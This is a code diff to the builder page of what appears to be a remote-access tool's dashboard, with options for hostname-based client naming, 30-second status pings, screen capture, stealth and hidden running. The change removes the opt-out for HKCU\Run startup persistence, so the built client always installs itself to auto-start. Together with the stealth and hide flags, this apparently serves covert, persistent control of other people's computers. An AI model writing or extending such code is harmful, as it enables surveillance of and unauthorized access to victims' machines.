@@ -272,8 +272,8 @@ body::before{content:'';position:fixed;top:-50%;left:-50%;width:200%;height:200%
       <input class="input" type="text" id="clientName" placeholder="Auto (hostname)" style="width:160px" oninput="updateBuildCmd()">
     </div>
     <div class="opt-row">
-      <div class="desc"><label>Startup Persistence</label><p>Auto-start via HKCU\Run registry entry</p></div>
-      <label class="toggle"><input type="checkbox" id="startupToggle" checked onchange="updateBuildCmd()"><span class="sl"></span></label>
+      <div class="desc"><label>Startup Persistence</label><p>Auto-start via HKCU\Run (always enabled)</p></div>
+      <label class="toggle"><input type="checkbox" checked disabled><span class="sl"></span></label>
     </div>
     <div class="opt-row">
       <div class="desc"><label>Status Pings</label><p>Send updates every 30s to keep the dashboard alive</p></div>
@@ -695,12 +695,11 @@ async function exportAllData(){
 // === Builder ===
 function buildArgs(){
   const n=document.getElementById('clientName').value.trim();
-  const s=document.getElementById('startupToggle').checked;
   const p=document.getElementById('pingToggle').checked;
   const sc=document.getElementById('screenToggle').checked;
   const st=document.getElementById('stealthToggle').checked;
   const h=document.getElementById('hideToggle').checked;
-  let a='';if(n)a+=' --name "'+n+'"';if(!s)a+=' --no-startup';if(!p)a+=' --no-ping';if(!sc)a+=' --no-screen';if(!st)a+=' --show';if(h)a+=' --hide';
+  let a='';if(n)a+=' --name "'+n+'"';if(!p)a+=' --no-ping';if(!sc)a+=' --no-screen';if(!st)a+=' --show';if(h)a+=' --hide';
   return a;
 }
 function updateBuildCmd(){
